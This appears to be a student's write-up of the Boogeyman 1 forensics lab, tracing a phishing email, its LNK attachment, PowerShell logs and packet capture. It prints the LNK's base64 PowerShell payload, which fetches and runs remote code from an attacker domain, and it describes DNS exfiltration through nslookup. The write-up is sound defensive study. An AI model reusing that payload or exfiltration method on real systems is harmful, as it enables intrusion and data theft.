# boogeyman 1

## [Introduction] New Threat in town

### Artefacts

- Copy of the phishing email (dump.eml)
- Powershell Logs from Julianne's workstation (powershell.json)
- Packet capture from the same workstation (capture.pcapng)
![Artefact Image](img/Artefacts.png)

### Tools

- Thunderbird - a free and open-source cross-platform email client.
- LNKParse3 - a python package for forensics of a binary file with LNK extension.
- Wireshark - GUI-based packet analyser.
- Tshark - CLI-based Wireshark.
- jq - a lightweight and flexible command-line JSON processor.

### built-in command-line tools

- grep
- sed
- awk
- base64

## [Email Analysis] Look at the headers

We have given the email named dump.eml and this is the content of the email

![Email Content](img/email_content.png)

What is the email address used to send the phishing email?

![Email Sender](img/email_sender.png)

What is the email address of the victim?

![Email Victim](img/email_victim.png)

What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
If use thundermail tools after open the email dump. go to navbar and open View -> Message Source or just use shortcut ctrl + U

![Third-party mail](img/thirdparty_mail.png)

What is the name of the file inside the encrypted attachment?
To get the file first and extracted have two ways:

- download directly from thunderbird tool

![Thunderbird Download](img/thunderbird_download.png)

- Use command tool to extract the payload from the email and encode to base64 (i extract with grep and nano to clear the not usable payload)

![Get ZIP command](img/getzip_command.png)

and when we want to extract it we found the the name of the file inside the encrypted attachment __Invoice_20230103.lnk__

![Extract Zip](img/extract_zip.png)

What is the password of the encrypted attachment?
We can found the password from the attachmed email it is __Invoice2023!__

Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
after we extract the file we use lnkparse tool to see the inside and we can foudn the encoded payload

    lnkparse Invoice_20230103.lnk

![lnk Payload](img/lnk_payload.png)

the payload is: __aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==__

## [Endpoint Security] Are you sure that's an invoice?

What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
First i was very struggling to found the domain than i search in other writeup and they use this command to find the domain

    cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq

![Domain Search Result](img/domain_search.png)

and i found the two domain

![Domain 1](img/domain_search_1.png)

![Domain 2](img/domain_search_2.png)

Ans: __(cdn.bpakcaging.xyz,files.bpakcaging.xyz)__

What is the name of the enumeration tool downloaded by the attacker?
The result before can be used to search the enumeration tool that downloaded

![Enum Tool](img/enumeration_tool.png)

Ans: __seatbelt__

What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
once again the result from previous question can answer this question and we can find in this

![File Accessed](img/file_accessed.png)

Ans: __C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite__

What is the software that uses the file in Q3?
We can see from previous question that the software use is sticky notes
Ans: __Microsoft Sticky Notes__

What is the name of the exfiltrated file?
From the result before (again) we can find the answer

![Exfiltrated File](img/exfiltrated_file.png)

ans: __protected_data.kdbx__

What type of file uses the .kdbx file extension?
we can search in the internet that .kdbx file extension uses in keepass
ans: __keepass__

What is the encoding used during the exfiltration attempt of the sensitive file?
we can find from the result before that uses hex

![Encoding Exfiltration](img/exfiltration_encoding.png)

ans: __hex__

What is the tool used for exfiltration?
the tool used for exfiltration is in below

![Exfiltration Tool](img/exfiltration_tool.png)

ans: __nslookup__

## [Network Traffic Analysis] They got us. Call the bank immediately

From this section we will use the wireshark to track the traffic in capture.pcapng

What software is used by the attacker to host its presumed file/payload server?
From the previous found we can see the destination of the attacker is 161.71.211.113, we can use this information to filter wireshark

    HTTP && ip.addr == 167.71.211.113

after we found we open and follow the packet to the http stream. right click -> follow -> http stream
and we found the answer

![Filter and Follow HTTP Stream](img/follow_http_stream.png)

![HTTP Stream](img/http_stream.png)

ans: __python__

What HTTP method is used by the C2 for the output of the commands executed by the attacker?
we can see the normal method to send the payload is POST

ans: __POST__

What is the protocol used during the exfiltration activity?
Looking back at the previous question, we can identify the protocol based on the tool used during exfiltration.

ans: __DNS__

What is the password of the exfiltrated file?
I struggle to search the password because i should to analyze the 46 packet in POST method. in brief i found it in frame 44467 and we decode the number in cyberchef and we found the password

![44467 Stream](img/44467_stream.png)\

![Decode Stream](img/decode44467_stream.png)

ans: __%p9^3!lL^Mz47E2GaT^y__

What is the credit card number stored inside the exfiltrated file?
i very struggle in this last question and finally i search the method in other writeup and i found we should extract the payload from the url that send from victim to attacker